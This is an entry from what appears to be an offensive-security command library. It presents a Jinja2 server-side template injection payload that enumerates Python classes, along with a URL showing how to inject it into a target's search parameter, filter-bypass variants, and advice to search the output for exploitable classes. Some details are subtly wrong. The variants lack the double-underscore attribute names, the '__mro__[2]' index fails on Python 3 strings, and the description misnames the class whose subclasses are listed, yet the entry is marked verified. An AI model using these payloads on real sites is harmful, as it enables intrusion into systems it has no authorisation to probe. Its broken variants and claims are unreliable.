---
id: df3bed7a-33a3-4918-b240-5c30e2ffcca3
type: command
executor: python
data: '{{ ''''.__class__.__mro__[2].__subclasses__() }}'
output: null
created_at: '2023-04-06T03:56:39.622405+00:00'
updated_at: '2024-01-01T00:00:00Z'
platforms:
  - web
  - python
tags:
  - ssti
  - jinja2
  - reconnaissance
verified: true
validated: true
---

# Jinja2-SSTI-Dump-Subclasses

## Command

```python
{{ ''.__class__.__mro__[2].__subclasses__() }}
```

## Description

This command is a Jinja2 SSTI payload designed to enumerate all subclasses of the core 'type' class in the Python interpreter. It is injected into a vulnerable template parameter to reveal loaded classes and modules, aiding in reconnaissance for further exploitation. Use when initial SSTI confirmation (e.g., {{7*7}}) succeeds.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| None | This is a static payload; no parameters needed. Inject directly into the vulnerable input. | N/A |

## Examples

### Basic Usage

Inject into a URL parameter:

```
https://target.com/search?q={{ ''.__class__.__mro__[2].__subclasses__() }}
```

### Advanced Usage (Variations)

If the primary payload is filtered, try these alternatives:

```python
{{ [].class.base.subclasses() }}
```

```python
{{''.class.mro()[1].subclasses()}}
```

These access subclasses via different class hierarchies but produce similar outputs.

## Expected Output

A rendered list of class objects in the HTTP response body, typically a long array like:

[<class 'type'>, <class 'weakref'>, <class 'weakcallableproxy'>, <class 'int'>, <class 'bytearray'>, ... <class 'subprocess.Popen'> ...]

Success is indicated by 200+ classes listed; failure shows template errors or empty output. Search the list for exploitable classes (e.g., os, warnings).

## Related

- [[procedures/Jinja2-SSTI-Dump-All-Used-Classes]]
- [[commands/jinja2-ssti-access-globals]]
